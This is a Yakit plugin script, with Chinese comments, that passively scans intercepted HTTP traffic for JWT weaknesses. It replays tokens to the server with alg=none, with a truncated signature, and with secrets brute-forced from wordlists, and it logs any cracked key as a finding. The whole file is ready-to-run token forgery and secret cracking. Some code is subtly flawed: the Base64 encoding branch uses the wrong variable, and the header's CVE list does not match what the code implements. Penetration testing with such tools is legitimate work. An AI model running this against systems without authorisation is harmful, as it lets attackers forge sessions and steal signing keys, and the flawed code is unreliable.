/*
插件名称: 被动 JWT 漏洞综合扫描插件 By Li2737
描述: 用于扫描 JWT Token 可能存在的常见漏洞
第三方 JWT 签名字典: https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list

支持检测的漏洞: 
1. CVE-2015-2951: HS256 → none 签名绕过 ✅
2. CVE-2016-10555: RS256 → HS256 算法混淆攻击
3. CVE-2018-0114: JWKS 公钥注入伪造密钥
4. CVE-2020-28042: 空签名攻击
5. CVE-2022-21449: ECDSA 签名伪造
6. 未验证签名攻击: 修改 payload 不重新计算签名 ✅
7. 签名密钥爆破 ✅
*/

yakit.AutoInitYakit() // 初始化 Yakit 插件

// ============================ 全局变量 ============================
var currentCount = 0                     // 计数器（保留扩展用）
var global_total_secrets = []
var global_regexp = re.MustCompile(`e(yJ|yA|wo|wk|w0)[A-Za-z0-9-_]{17,}={0,2}\.e(yJ|yA|wo|wk|w0)[A-Za-z0-9-_]{17,}={0,2}\.[A-Za-z0-9-_]+={0,2}`)     // 初始化 JWT 正则

// ============================ 命令行参数定义 ============================
// 漏洞扫描类型
vulType := cli.StringSlice("vulType",
    cli.setVerboseName("漏洞扫描类型"),
    cli.setDefault("vul_ForceSecret"),
    cli.setRequired(true),
    cli.setSelectOption("综合扫描", "vul_ALL"),
    cli.setSelectOption("空签名 (none signature)", "vul_NoneSignature"),
    cli.setSelectOption("签名不校验", "vul_AnySignature"),
    cli.setSelectOption("密钥爆破", "vul_ForceSecret"),
    cli.setHelp(`选择要执行的漏洞扫描类型: 
- vul_ALL: 综合扫描
- vul_NoneSignature: 检测空签名漏洞
- vul_AnySignature: 检测签名不校验漏洞
- vul_ForceSecret: 密钥爆破`),
)[0]

// 密钥字典配置
secretPayloads := cli.String("secretPayloads",
    cli.setDefault("jwt.secrets.list"), // 默认使用的密钥字典
    cli.setRequired(true),              // 参数为必填项
    cli.setVerboseName("密钥字典配置"),
    cli.setHelp(`1. 请在【字典管理】中创建名为 jwt.secrets.list 的字典, 以提高 JWT 密钥爆破成功率。
2. 支持配置多个字典, 使用英文逗号 , 分隔, 例如: jwt.secrets.list,custom.dict.jwt`),
)

// 密钥编码格式
encodingFormat := cli.StringSlice("encodingFormat",
    cli.setVerboseName("密钥编码格式"),
    cli.setDefault("ALL"), // 默认值与选项保持一致
    cli.setRequired(true),
    cli.setSelectOption("UTF-8 和 Base64", "ALL"),
    cli.setSelectOption("Base64 编码", "Base64"),
    cli.setSelectOption("UTF-8 编码", "UTF-8"),
    cli.setHelp(`选择用于爆破的密钥编码格式: 
- UTF-8: 原始字符串
- Base64: Base64 编码后的密钥
- ALL: 同时尝试 UTF-8 和 Base64（推荐）`),
)[0]

// 检查命令行参数合法性
cli.check()



// ============================ 漏洞检测函数 ============================
/*
   @brief: 检测任意签名漏洞（修改 JWT 签名部分, 观察响应是否一致）
   @param isHttps      string: 是否使用 HTTPS
   @param urlStr       string: 请求的 URL
   @param reqStr       string: 原始请求报文
   @param baseResponse string: 基准响应报文
   @return bool        true 表示存在漏洞, false 表示不存在
*/
func signatureAny(isHttps, urlStr, reqStr, baseResponse) {
    // 提取 JWT Token
    jwtList := global_regexp.FindAllString(reqStr, -1)
    if len(jwtList) == 0 {
        log.Info("未在请求中提取到 JWT Token, 跳过检测。")
        return false
    }
    firstJwt := jwtList[0] // 使用第一个 token, 避免越界风险

    // 构造修改后的请求, 将签名部分替换为伪造值（简单截断）
    forgedJwt := firstJwt
    if len(firstJwt) > 5 {
        forgedJwt = firstJwt[:len(firstJwt)-5]
    }
    modReq := str.ReplaceAll(reqStr, firstJwt, forgedJwt)

    // 发送请求并获取响应
    rsp, _, err := poc.HTTPEx(modReq, poc.https(isHttps), poc.timeout(15))
    if err != nil {
        log.Error("发送请求失败: %v", err)
        return false
    }
    modRsp := poc.FixHTTPResponse(rsp.RawPacket)

    // 计算响应相似度
    sim := str.CalcSimilarity(baseResponse, string(modRsp))
    if sim > 0.98 {
        log.Info("检测结果: JWT 存在任意签名漏洞, 相似度 %v", sim)
        yakit.StatusCard("任意签名漏洞", sim)

        risk.NewRisk(
            urlStr,
            risk.title(sprintf("存在签名不校验漏洞: %v", urlStr)),
            risk.severity("info"),
            risk.description("服务端未对 JWT 签名进行校验。"),
            risk.solution("服务端应严格校验 JWT 签名, 避免任意签名绕过。"),
            risk.parameter(firstJwt),
            risk.payload(forgedJwt),
            risk.request(reqStr),
            risk.response(baseResponse),
        )
        return true
    }

    log.Info("检测结果: JWT 不存在任意签名漏洞, 相似度 %v", sim)
    return false
}



/*
   @brief: 检测空签名漏洞（alg=none, 签名为空）
   @param https        string: 是否使用 HTTPS
   @param urlStr       string: 请求的 URL
   @param reqStr       string: 原始请求报文
   @param baseResponse string: 基准响应报文
   @return bool        true 表示存在漏洞, false 表示不存在
*/
func signatureNone(https, urlStr, reqStr, baseResponse) {
    // 提取 JWT Token
    jwtList := global_regexp.FindAllString(reqStr, -1)
    if len(jwtList) == 0 {
        log.Info("未在请求中提取到 JWT Token, 跳过检测。")
        return false
    }
    firstJwt := jwtList[0] // 使用第一个 token, 避免越界风险

    // 解析原始 token
    parsedToken, _, err := jwt.Parse(firstJwt, "")
    if err != nil {
        log.Error("JWT 解析失败: %v", err)
        return false
    }

    claims := parsedToken.Claims
    header := parsedToken.Header
    header.Delete("alg") // 删除原有算法字段

    // 构造 alg=none 的新 token
    noneToken, err := jwt.JWSGenerateEx("none", header, claims, []byte{})
    if err != nil {
        log.Error("生成空签名 JWT 失败: %v", err)
        return false
    }

    // 替换请求中的原始 token
    modReq := global_regexp.ReplaceAllString(reqStr, noneToken)

    // 发送请求并获取响应
    rsp, _, err := poc.HTTPEx(modReq, poc.https(https), poc.timeout(15))
    if err != nil {
        log.Error("发送请求失败: %v", err)
        return false
    }
    modRsp := poc.FixHTTPResponse(rsp.RawPacket)

    // 计算响应相似度
    sim := str.CalcSimilarity(baseResponse, string(modRsp))
    if sim > 0.98 {
        log.Info("检测结果: JWT 存在空签名漏洞, 相似度 %v", sim)
        yakit.StatusCard("空签名漏洞", sim)

        risk.NewRisk(
            urlStr,
            risk.title(sprintf("存在签名不校验漏洞: %v", urlStr)),
            risk.typeVerbose("JWT 签名漏洞"),
            risk.severity("info"),
            risk.description("服务端没有校验 JWT 签名。"),
            risk.solution("服务端应该校验 JWT 签名。"),
            risk.parameter(firstJwt),
            risk.payload(noneToken),
            risk.request(reqStr),
            risk.response(baseResponse),
        )
        return true
    }

    log.Info("检测结果: JWT 不存在空签名漏洞, 相似度 %v", sim)
    return false
}



// ============================ 弱密钥爆破 ============================

/*
   @brief: 从字典管理中加载 JWT 密钥, 并根据编码格式处理
   @param dictNames String: 以逗号分隔的字典名称列表
   @return []String: 所有处理后的 JWT 密钥
*/
loadJWTSecretsFromDict = func(dictNames) {  
    totalSecrets := jwt.CommonWeakJWTKeys                // 加载内置弱密钥  
    dictList := str.SplitAndTrim(dictNames, ",")  
      
    if len(dictList) == 0 {  
        log.Warn("[-] 未配置任何密钥字典, 请在【字典管理】中创建 jwt.secrets.list 等字典以提高爆破成功率。")  
        return totalSecrets
    }

    for dictName in dictList {
        if len(dictName) < 1 {
            log.Warn(f"[!] 字典 ${dictName} 不存在, 已跳过。")
            continue
        }

        payloadTemplate := f`{{payload(${dictName})}}`
        secrets := fuzz.Strings(payloadTemplate)

        totalSecrets += secrets
    }

    // 并发编码处理  
    if len(totalSecrets) > 0 {
        encodedSecrets := make([]string, 0, len(totalSecrets) * 2)  // 预分配容量

        var encodeWg = sync.NewSizedWaitGroup(10)                   // 可根据CPU核心数调整  
        var encodeMu = sync.NewMutex()  
          
        // 使用正确的并发模式  
        for _, secret := range totalSecrets {  
            encodeWg.Add(1)  
            go func(s) {  
                defer encodeWg.Done()  
                  
                var results = make([]string)  
                  
                switch encodingFormat {  
                case "UTF-8":  
                    results = []string{s}  
                case "Base64":  
                    results = []string{string(codec.DecodeBase64(secret)~)}
                case "ALL":  
                    results = []string{secret, string(codec.DecodeBase64(secret)~)}
                default:  
                    log.Warn(f"[!] 未知编码格式: ${encodingFormat}, 将使用原始密钥。")  
                    results = []string{s}  
                }  
                  
                // 使用 mutex 保护共享 slice 的写入
                encodeMu.Lock()  
                encodedSecrets = append(encodedSecrets, results...)  
                encodeMu.Unlock()  
            }(secret)  
        }

        encodeWg.Wait()         // 等待并发处理完成
        return encodedSecrets
    } 
}
// 初始化密钥列表
global_total_secrets = loadJWTSecretsFromDict(secretPayloads)

/*
   @brief: 尝试使用弱密钥爆破 JWT Token
   @param urlStr   string: 请求的 URL
   @param reqStr   string: 原始请求报文
   @param rspStr   string: 原始响应报文
   @return bool    是否发现弱密钥漏洞
*/
func crackSecret(urlStr, reqStr, rspStr) {
    // 从请求中提取所有 JWT Token
    jwtList := global_regexp.FindAllString(reqStr, -1)
    if len(jwtList) == 0 {
        log.Info("未在请求中提取到任何 JWT Token, 跳过爆破。")
        return false
    }

    foundVul := false

    for _, jwtToken := range jwtList {
        // 尝试使用已知弱密钥解析 JWT
        token, secretBytes, err := jwt.Parse(jwtToken, global_total_secrets...)
        if err != nil {
            log.Error("JWT 解析失败: %v", err)
            continue
        }

        if !token.Valid {
            log.Error("JWT Token 无效, 密钥未匹配: %v", jwtToken)
            continue
        }

        // 将密钥转换为可读字符串（UTF-8 或 Base64）
        var secretStr = ''
        if codec.IsUTF8(string(secretBytes))~ {
            secretStr = string(secretBytes)
        } else {
            secretStr = codec.EncodeBase64(string(secretBytes))
        }

        // 爆破成功, 记录漏洞
        log.Info("JWT 密钥爆破成功, 密钥: %v", secretStr)
        foundVul = true

        risk.NewRisk(
            urlStr,
            risk.title(sprintf("JWT弱密钥漏洞: %v", secretStr)),
            risk.severity("info"), // 风险严重级别: high/low/middle/info/debug
            risk.description("JWT 密钥可被暴力破解, 存在弱密钥风险。"),
            risk.solution("服务端应使用强随机密钥, 并严格校验 JWT 签名。"),
            risk.parameter(jwtToken),
            risk.payload(secretStr),
            risk.request(reqStr),
            risk.response(rspStr),
        )
    }

    return foundVul
}



// ============================ 主函数入口 ============================
/*
   @brief: 主函数入口, 根据 vulType 参数执行不同的漏洞检测
   @param isHttps bool: 是否使用 HTTPS
   @param url string: 请求的目标 URL
   @param request string: 原始请求报文
   @param response string: 原始响应报文
   @param vulType string: 漏洞检测类型（all/vul_AnySignature/vul_NoneSignature/vul_ForceSecret）
   @return void: 输出检测结果
*/
main = func(isHttps, url, request, response, vulType) {
    switch vulType {
    case "vul_ALL":
        signatureAny(isHttps, url, request, response)
        signatureNone(isHttps, url, request, response)
        crackSecret(url, request, response)

    case "vul_AnySignature": // 任意签名漏洞
        signatureAny(isHttps, url, request, response)

    case "vul_NoneSignature": // 空签名漏洞
        signatureNone(isHttps, url, request, response)

    case "vul_ForceSecret": // 弱密钥爆破
        crackSecret(url, request, response)

    default:
        log.Error("未知的 vulType 参数: %v", vulType)
    }
}

# mirrorFilteredHTTPFlow 劫持到的流量为 MITM 自动过滤出的可能和 "业务" 有关的流量, 会自动过滤掉 js / css 等流量
mirrorFilteredHTTPFlow = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
    main(isHttps, url, string(req), string(rsp), vulType)
}
